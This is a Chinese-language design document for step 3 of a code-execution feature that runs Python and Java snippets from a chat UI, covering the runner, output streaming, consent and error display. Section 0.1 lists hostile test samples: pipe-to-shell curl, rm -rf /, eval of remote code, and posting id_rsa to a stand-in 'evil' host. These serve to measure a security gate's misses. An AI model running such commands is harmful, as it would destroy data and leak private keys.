# 代码执行 步骤 3 设计 v2：runner + 前端接线

> 上游：`2026-08-11-code-exec-runner-v4-design.md`（v4 §11 第 3 步）、
> `2026-08-11-run-registry-step2-design.md`（步骤 2，已完成并合入 master）。
>
> 本步是**第一次让用户在界面上看见东西**：点代码块的「运行」，Python / Java 真跑起来，
> 输出实时流到右栏。

## 0.0 v1 错在哪（独立评审 + 自查，全部有实测）

| # | v1 的说法 | 实际 | 处理 |
|---|---|---|---|
| 1 | 「Java 文件名要匹配 public class，否则报 `class X is public, should be declared in a file named X.java`」 | **错。凭 javac 常识推断，没实测。** `public class Hello` 存成 `Main.java` 照跑，exit=0 | §0.3 重写；解析 public class 名的整套逻辑删掉 |
| 2 | 误报率 33% | 样本有偏（9 个无害样本里 5 个是专门构造来撞 shell 形状的）。无偏样本 20%，评审另一组 12% | §0.1 三组数字都列，说明方法学 |
| 3 | 「`files` 落盘与清理归调用方」 | 调用方是浏览器，**写不了服务端磁盘**。整条链路断的 | §2.4 新增服务端形态 |
| 4 | 同意键 `hash(cwd + 代码)` | cwd 只在服务端有（步骤 2 写死「绝不接受客户端传」），前端算不出来 | §5.3 移到服务端 |
| 5 | §0.2 的 uv 实测 | 在**没有 pyproject 的目录**做的，区分不出带不带 `--no-project` | §0.2 换成区分性实测 |
| 6 | 错误显示、SSE 生命周期、交互场景 | 整节缺 | §6 §7 §9 新增 |

---

## 0. 实测事实（本步设计的依据）

> 本仓规矩：设计依据必须是实测结果，不是推断。本节以外的判断一律标注「未实测」。

### 0.1 安全闸喂脚本正文：误报可观、漏报 100%

步骤 2 的 spec 写死过一条约束：「届时**必须把脚本正文也送进闸门**」。
**按字面执行是错的。** 三组独立测量（都用 `hasBlockingBashSecurityIssue`）：

| 样本集 | 无害样本 | 误报 | 危险样本 | 拦住 |
|---|---|---|---|---|
| `probe-step3-gate.mts`（含刻意构造） | 9 | 3 = **33%** | 2 | **0** |
| `probe-step3-gate2.mts`（未刻意构造，本文档作者） | 20 | 4 = **20%** | 5 | **0** |
| 评审另一组（未刻意构造） | 25 | 3 = **12%** | — | — |

**误报率取决于样本怎么选，三组都列出来是为了不把某个数字当客观事实。**
但**漏报是 0/2 和 0/5 两次独立测量，方向一致**——这一侧才是决定性的。

具体命中（比百分比更有说服力）：

```
[误报] py   正则行尾锚 $     → obfuscated-flags / locale 引用 $"…"     re.match(r"^\d+$", s)
[误报] java 正则行尾锚 $     → obfuscated-flags / locale 引用 $"…"     Pattern.matches("^\\d+$", s)
[误报] py   docstring 反引号 → obfuscated-flags / 词首连续引号
[误报] java HashMap 遍历     → command-substitution / 进程替换 >()      m.forEach((k,v)->System.out...)
[漏报] py   os.system("curl -s http://evil.sh | sh")
[漏报] py   subprocess.run("rm -rf /", shell=True)
[漏报] py   eval(urlopen("http://evil/x").read())
[漏报] py   shutil.rmtree("E:/ai-study/zuse")
[漏报] py   requests.post("http://evil/x", data=open("id_rsa").read())
```

**踩中的是「任何以 `$` 结尾的正则字面量」和「Java lambda 的 `->(`」——
这是最常见的写法，不是边角。** 而模型真写得出的危险 Python 一个都不认识。

原因不需要猜：`hasBlockingBashSecurityIssue` 是按 **shell 语法**做的模式匹配。
Python 正文里 `$(...)`、反引号只是普通字符；Python 真正危险的东西
（`os.system`、`subprocess(shell=True)`、`eval`、`shutil.rmtree`）它一个都不覆盖。

**结论：闸门只对「最终执行的那条 shell 命令」有意义，对脚本正文没有意义。** 见 §5。

### 0.2 Python：必须用 `uv run --no-project`（区分性实测）

在一个**有 `pyproject.toml` 的目录**里跑同一个外部脚本：

```
A. uv run <script>                （不带 --no-project）
   Using CPython 3.11.12
   Creating virtual environment at: .venv
   Installed 1 package in 14ms
   script ran 3.11.12                                   exit=0
   跑完后目录里: .venv, pyproject.toml, s.py, uv.lock   ← 在用户仓库里建了 venv 和 lock

B. uv run --no-project <script>
   script ran 3.11.12                                   exit=0
   跑完后目录里: pyproject.toml, s.py, uv.lock          ← 零副作用
```

评审另测出更狠的一条：**用户项目里一个解析不了的 `pyproject.toml`**，
不带 `--no-project` 时 `× No solution found when resolving dependencies`、**脚本根本没跑**；
带上则正常。（这条我未复现，标注来源。）

所以 §2.2 不是「有争议的取舍」，是几乎没得选。

### 0.3 Java：三件事，其中一件推翻了本仓 CLAUDE.md

**(a) 单文件源码模式不校验文件名**（推翻 v1 的说法）：

```
public class Hello {...}  存成 Main.java  → java Main.java → "A ok"  exit=0
```

**(b) 真正会失败的是这两种**——恰恰是模型最爱写的形态：

```
class Helper{...} public class Main{main}  → exit=1  「在类 Helper 中找不到 main(String[]) 方法」
System.out.println("D ok");   （裸语句）    → exit=1  「需要 class、interface、enum 或 record」
```

即：**第一个顶层类必须带 `main`**，且**必须有类**。

**(c) 管道下 stdout 是 OEM，`-Dfile.encoding` 无效**（看原始字节）：

| 命令 | stdout 前几字节 | 判定 |
|---|---|---|
| `java Hello.java` | `C4 E3 BA C3` | GBK |
| `java -Dfile.encoding=UTF-8 …` | `C4 E3 BA C3` | **无效** |
| `java -Dstdout.encoding=UTF-8 …` | `E4 BD A0 E5 A5 BD` | UTF-8 ✓ |

JDK 18+ 的 `file.encoding` 默认已是 UTF-8（JEP 400），设它是空操作；
管道编码归 `stdout.encoding` / `stderr.encoding`（JDK 19+）。
评审补测：**编译错误（stderr）同样只认 `-Dstderr.encoding`**——而编译错误正是
Java 片段最常见的用户可见输出。

`JAVA_TOOL_OPTIONS` 也有效但会往 stderr 多打一行（`Picked up JAVA_TOOL_OPTIONS: …`，实测），
所以用命令行 `-D`。

→ **本仓 `CLAUDE.md` 第四节「中文输出要 `-Dfile.encoding=UTF-8`」这行是错的，本步一并改掉。**

### 0.4 未实测、不下结论

- JDK 11–17 上 `stdout.encoding` 是否被静默忽略（本机只有 Temurin 21）
- 非 Windows 平台的 `uv` / `java` 行为
- `pytest` / `vite dev` 的 ANSI 输出（v4 §8 只测了 11 条命令，ESC 全为 0）
- 原生 `EventSource` 的重连行为（§6 按规范设计，未实跑验证）

---

## 1. 范围

**做**：runner（Python/Java → 可跑的东西）、store 双槽、`RailExec` + 终端输出区、
SSE 接线、运行前确认、错误文案。

**不做**：命令输入框 / 在飞运行列表（步骤 4）；把 run 暴露成模型工具（步骤 5，
**本步模型仍看不到运行输出**）；Python/Java 以外的语言。

---

## 2. runner

### 2.1 `planExec`：纯函数

```ts
export type ExecKind = 'python' | 'java'
export interface ExecPlan {
  command: string                              // 交给 run 服务的那条命令
  files: { name: string; content: string }[]   // 相对文件名，不含目录
  label: string                                // 展示用：「用 uv 跑 Python」
  hint?: string                                // 静态可见的问题，见 §2.3
}
export function planExec(kind: ExecKind, code: string): ExecPlan
```

**返回相对文件名，不含绝对路径**——目录由服务端决定（§2.4）。
纯函数、不碰文件系统、不起进程，所以可以只靠断言字符串来测。

### 2.2 Python

```
文件: main.py
命令: uv run --no-project "<dir>/main.py"
```

`--no-project` 的依据见 §0.2。**代价：脚本 import 不到用户项目的依赖**，
`import pandas` 会失败。这条必须在 UI 上说人话：stderr 含 `ModuleNotFoundError` 时提示
「这段代码用到了第三方库；本步只跑独立片段，装依赖请用聊天让模型帮你跑命令」。

**不自动装依赖**——静默装包是比报错更坏的行为。

### 2.3 Java

```
文件: Main.java        ← 文件名随便取，实测不校验（§0.3a）
命令: java -Dfile.encoding=UTF-8 -Dstdout.encoding=UTF-8 -Dstderr.encoding=UTF-8 "<dir>/Main.java"
```

三个 `-D` 都加：`stdout`/`stderr` 是本机实测有效的那两个，`file.encoding` 成本为零、
用于兼容 JDK 19 以下（**该兼容性未实测**，见 §0.4）。

**`hint` 的用途**（§0.3b 那两种失败）：`planExec` 静态扫一眼代码，
第一个顶层类不含 `main`、或者压根没有类时，在确认框里先提醒一句
「这段 Java 看起来跑不起来：单文件模式要求第一个类里有 `main`」。
**只提示、不阻断**——扫描是启发式的，拦下去就是又一个假防护（同 §5 的教训）。

### 2.4 谁落盘：必须新增服务端形态

**这是 v1 的架构空洞**：`planExec` 在浏览器里跑，而浏览器写不了服务端磁盘。
步骤 2 的 spec 还写死过「本步 `POST /api/runs` **只接受 `command` 字符串一种形态**」。

所以步骤 3 **必须**扩展这个端点：

```
POST /api/runs
  旧形态: { command, sessionId, confirmed? }        ← 保留不动
  新形态: { exec: { kind, code }, sessionId, confirmed? }
```

服务端收到 `exec` 时：`planExec` → 在 tmp 下建一次性目录 → 写文件 → 起 run。

**路径约束（这是新开的写文件能力，必须写死）**：

- 目录 = `join(os.tmpdir(), 'zuse-run-' + randomUUID())`，**每次新建**
- 文件名**只用 `planExec` 返回的常量**（`main.py` / `Main.java`），
  **绝不用任何来自请求体的字符串拼路径**——那就是路径穿越
- 落盘前 `mkdir` 失败即 500，不降级往别处写
- **cwd 仍然是会话 cwd**（不是 tmp 目录）：脚本里 `open("data.csv")` 读的是用户项目里的
  文件，符合直觉；而脚本本体不污染用户仓库

**清理**：服务端订阅该 run 的 `end` 事件（用 `internal: true`，否则会算进「有没有人在看」，
把片段档的 `onDetach:'kill'` 顶掉——步骤 2 刚踩过这个坑），收到后删目录。
故意不在进程退出前删：Windows 上文件被占用时删除会失败。
删除失败**不上报给用户**（tmp 里的垃圾不是用户的问题），`console.warn` 一行。

---

## 3. store 双槽

现状（读过原文）：`activePreview.ts:38` 只有一个槽，`Rail.tsx:85` 是
`{run ? <RailRun run={run}/> : null}`。单槽 = 预览与执行互斥：跑着的 Python 会被
「打开一个 HTML 预览」挤掉。

**做法**：拆成两个模块级槽，各自独立的 `open/close/use`：

```
activePreview → RailRun    （HTML/JS/Vue 预览，iframe）
activeExec    → RailExec   （Python/Java 真跑，终端）
```

`Rail.tsx` 里是两个固定槽位，都用 `{x ? <C/> : null}`。
（`railSlot.test.tsx` 已用最小复现证明：静态 JSX 子节点按槽位对齐，条件子节点不论真假
都占一格，**不会**让后面的兄弟重挂。）

**三条不能漏的连带**：

1. **CSS 相邻选择器**。`styles.css` 有 `.rail > .preview-console + .steps`
   （`Rail.tsx:66` 注释指过），它依赖 `RailRun` 和 `StepsDrawer` 相邻。
   `RailExec` 插在两者之间会让这条**静默失配**，步骤区拿回 180px 下限——
   就是注释里记着的「预览只剩 33px」那个坑的镜像。
   **CSS 必须同步改，并在真浏览器里重新量高度分配**（`Rail.tsx:67` 原话）。
2. **`useIsRunOpen` 是运行按钮文案的唯一来源**（`Markdown.tsx:136,159`），
   `closeRun(runId)` 同理（`Markdown.tsx:154`）。拆槽后 CodeBlock 要同时看两个槽：
   提供一个 `useIsBlockActive(id)` 合并布尔，`closeBlock(id)` 合并关闭。
3. **切会话要同时清两个槽**——`activePreview` 那个坑（右栏挂着上一个会话的内容）
   在新槽上会原样复发。

---

## 4. 终端输出区

### 4.1 CRLF 顺序写死

v4 §8 实测：`mvn -v` 有 5 个 CR、`tsc -v` 有 1 个。把 `\r` 一律当「回到行首覆盖本行」，
**Windows 上会把每一行都吃掉**。顺序：**先 `\r\n` → `\n`，再处理裸 `\r`**。

### 4.2 ANSI 只做 strip

v4 §8 实测 11 条命令 ESC 全为 0。代价：设了 `FORCE_COLOR` 的用户看到无色输出。

### 4.3 增量处理的四个边界

SSE 推的是增量。**不要每来一块就重排全文**（上万行时是 O(n²)）。维护「已处理的尾巴」，
只处理新增部分。四个边界都要有测试：

1. **`\r\n` 跨块分裂**：前块结尾 `\r`、后块开头 `\n`。悬挂的 `\r` 必须留到下一块再判。
2. **ANSI 序列跨块分裂**：`\x1b[3` | `1m`。§4.2 那条正则只对完整文本成立，
   增量下必须同样缓冲悬挂的转义序列——**和 CRLF 是同一类问题，v1 只写了前者**。
3. **收尾冲刷**：没有下一块了（进程 `end`）时，悬挂的 `\r` / 半截转义序列必须吐出来，
   否则最后一行丢。
4. **两条流各一份状态**：`out` 和 `err` 是独立的流（`run.ts:22`），
   悬挂状态必须各自持有。

### 4.4 out / err 怎么显示：**合并成一条，err 标红**

v1 没拍板，这里拍：合并渲染，`err` 的片段加一个类名标红。

理由：用户看的是「这段代码跑起来什么样」，分成两个框要自己在脑子里按时间缝合。
**代价（写下来）**：两条流的到达顺序不保证与进程实际写出的顺序一致（各自独立解码 +
各自的首窗延迟），所以交错处可能错位。可接受——终端本来就是这样。
`\r`「覆盖本行」的语义在合并后严格说是错的，但 §4.2 已经确定输出基本无 ANSI/进度条，
影响面小。

---

## 5. 安全闸：不做内容检测，改成一次明确确认

### 5.1 候选与选择

§0.1 实测排除了「按字面把正文送闸」。剩下：

| | 做法 | 代价 |
|---|---|---|
| A | 只对最终 shell 命令过闸 | **本步等于空转**：命令形状固定为 `uv run --no-project "<tmp路径>"`，永远不会命中闸门 |
| B | 给脚本语言写专门模式（`os.system`/`eval`/…） | 极易绕过（`getattr(os,'sys'+'tem')`），且新增误报。**做了会给人「有防护」的错觉，比明确说「这会真的执行」更危险** |
| **C** | **不做内容检测，运行前一次明确确认** | 多一次点击 |
| D | C + 顺带显示可疑点但不阻断 | 实现量最大 |

**选 C**，D 作为后续增强。理由：本步执行的是**用户自己点击的、屏幕上就摆着的代码**，
真正的知情人是用户不是正则；v4 §5 已确立过同一判断（安全闸的价值在把理由显示给人看）。

**明确不做**：沙箱 / 容器隔离。不在本仓能力范围内，写下来免得被当成遗漏。

### 5.2 承认推翻了什么

`runsRoutes.ts:64-65` 现在明写：

> 「**不做同意缓存**（v4 §9 的 `hash(cwd+'\0'+command)` 属于**步骤 4** 的项目档输入框）
> ——『能不能确认』和『要不要记住这次确认』是两件正交的事」

本步在**步骤 3** 引入了同意缓存，**这一句被推翻**。理由：那句针对的是「命令文本」这个键，
而本步的键是「代码正文」，且没有输入框那种「每次都不一样」的问题。
实现时那段注释要一并改掉，否则下个人读代码会以为实现跑偏。

**已存在的确认协议要复用，不要另起一套**：步骤 2 已实现 409 `security_confirm` +
`confirmed: true`（`runsRoutes.ts:82-94`）。`exec` 形态走同一条路，
只是 409 的原因从「命中安全闸」变成「这会在你电脑上真的执行这段代码」。

### 5.3 同意键放服务端

v1 说「`hash(cwd + '\0' + 代码正文)`，存会话内存层」，但没说哪一端——
**前端算不出来**：cwd 只在服务端有（`runsRoutes.ts:49-55` 写死「绝不接受客户端传」），
且只在 201 响应里回，那已经是跑起来之后。

**所以缓存放服务端**，挂在会话上：`Set<string>`，键 = `sha256(cwd + '\0' + code)`。
换一段代码要重新确认——代码是逐字执行的，改一个字就是另一段程序。
**不写进 `permissions.allow`**（持久化，一次点击换永久放行太重）。

**已知代价**：模型每次微调代码都要重新确认。缓解留给步骤 4。

---

## 6. SSE 生命周期

**用 `fetch` + `ReadableStream` 读流，不用原生 `EventSource`。**

原因：`EventSource` 在服务端关连接时会**自动重连**（约 3s），而我们的服务端在
`end` 之后就 `res.end()`（`runsRoutes.ts:154`）。两者相乘 =
「重连 → 拿到全量 replay + end → 又被关 → 再重连」的**无限循环**。
连带两个更糟的后果：

- 重连窗口内订阅者归 0 → `onDetach:'kill'`（`policy.ts:42`）→ **一次网络抖动杀掉在跑的进程**
- §4.3 的增量缓冲与 replay 冲突：重连后已渲染内容被再推一遍

`fetch` 流不自动重连，读到 `end` 就主动 `AbortController.abort()`，语义可控。
**代价**：分帧要自己解（`data: …\n\n`），比 `EventSource` 多写十几行。
（`EventSource` 的重连行为按规范设计，**未实跑验证**——但用 fetch 后这一条不构成风险。）

**离开页面 / 卸载组件**：`abort()` → 服务端 `req.on('close')` → 退订 →
片段档把进程收掉。这是设计意图（v4 §1），不是 bug。

---

## 7. 错误与结束原因怎么显示（v1 整节缺）

`run.ts:126-129` 把这件事明确推给了 UI：**spawn 失败（没装 java / 没装 uv，
首次使用最可能的失败）表现为「没有任何输出 + exitCode null」**。步骤 3 就是那个 UI。

`run.ts:17` 的 7 档 `EndReason` 各要一句人话：

| reason | 文案 | 备注 |
|---|---|---|
| `exit` (code 0) | 「运行结束」 | |
| `exit` (code≠0) | 「运行结束，退出码 N」 | |
| `exit` (code null, 无任何输出) | 「**没能启动**——本机可能没装 uv / java」 | 首次使用最常见 |
| `wall-clock` | 「跑了 5 分钟，已停止」 | 片段档 300s（`policy.ts:38`） |
| `idle` | 「一直没有输出，已停止」 | 片段档 idleMs=null，本步不会出现，但文案要有 |
| `output-cap` | 「输出太多（超过 20 万字），已停止」 | `policy.ts:44` |
| `detach` | 「你关掉了运行面板，已停止」 | |
| `zombie` | 「**进程没能杀掉**，可能还在后台跑」 | 必须显眼，这是需要用户自己处理的情况 |
| `killed` | 「已停止」 | 用户点的停止 |

**截断要显式说**：`output-cap` 时终端末尾要有一行明确的「输出被截断」，
不能让用户以为程序就输出了这么多。

---

## 8. 明确的取舍

1. **模型看不到运行输出**（v4 §10）。报错要用户手工贴回聊天框。步骤 5 才解决。
2. **Python 片段跑不了第三方库**（§2.2）。
3. **只有 Python / Java**。
4. **关掉右栏 = 断连 = 进程被收掉**（步骤 2 刚修好的 `onDetach:'kill'`，实测 0.58s 生效）。
   想保留要等步骤 4 的在飞列表。
5. **运行中切会话 = 进程被杀**。清槽 → 卸载 → abort → 订阅归零 → kill。
   本步没有在飞列表，只能这样。写成明确取舍，不是遗漏。

---

## 9. 交互场景

- **流式输出中点运行**：已被 `Markdown.tsx:151` 的 `disabled={streaming}` 挡住，
  实现时**复用它**，别漏。
- **连点两次运行**：正常情况按钮在 open 时变「停止」挡住了。但 §5 插入了一个
  **异步确认框**——从点击到 POST 之间 `open` 仍是 false、按钮仍写「运行」，
  连点 = 两个 run。**必须加一个 pending 态把按钮禁掉**，这是 §5 新引入的竞态。
- **同一代码块先预览后运行**：两个槽独立，互不影响（这正是拆槽的目的）。

---

## 10. 测试要点

- `planExec`：Python/Java 的命令与文件内容；Java 的 `hint`（无类 / 第一个类无 main）
- 服务端 `exec` 形态：文件真的落到 tmp、**文件名不受请求体影响**、`end` 后目录被删、
  删失败不抛
- 清理订阅用的是 `internal: true`（否则顶掉 `onDetach:'kill'`）——**变异验证：去掉它，
  片段档的 detach 测试必须变红**
- CRLF：`a\r\nb` → 两行；裸 `\r` → 覆盖；**`\r`/`\n` 跨块分裂**；**ANSI 跨块分裂**；
  **`end` 时悬挂内容被冲刷**；out/err 各一份状态
- **变异验证**：把 CRLF 归一化顺序调换（先处理裸 `\r`）→ 对应测试必须变红
- store 双槽：开 exec 不关 preview，**反过来也测**；切会话两个槽都清
- 同意：同一段代码第二次不问；**改一个字符就重新问**；不同 cwd 视为不同
- SSE：读到 `end` 后**真的 abort 了**（不重连）
- spawn 失败（没装 java）的 UI 表现
- **真浏览器点一遍**（本仓铁律：测试绿 ≠ 能用）：点运行 → 输出流出来 →
  点停止 → 进程真的停 → 右栏高度分配没被 `RailExec` 挤坏

---

## 11. 落地顺序

1. **`detect.ts` 认 python/java**。现状 `detect.ts:8-15` 只有 html/js/ts/jsx/tsx/vue，
   `detect.ts:35` 注释明写「未知语言（python/java/bash/…）返回 null」——
   **今天 Python 代码块上压根没有运行按钮**。`PreviewKind` / `ExecKind` 类型要分开。
2. `planExec` + 测试（纯函数，无依赖）
3. 终端文本处理（CRLF / ANSI / 增量 / 双流）+ 测试
4. 服务端 `exec` 形态：落盘 + 清理 + 路径约束 + 同意缓存（§2.4 / §5.3）
5. store 双槽 + `Rail.tsx` 接线 + **`styles.css` 相邻选择器同步改**
6. `RailExec` 组件 + fetch 流订阅 + 错误文案（§7）
7. 确认框（复用 `ConfirmDialog` / `PermissionCard`，别新做）
8. **改 `CLAUDE.md` 第四节的 `-Dfile.encoding` 那行**（§0.3c）
9. rebuild + 重启 daemon + **真浏览器验证**
10. 合本地 master + 写 `docs/features.md`
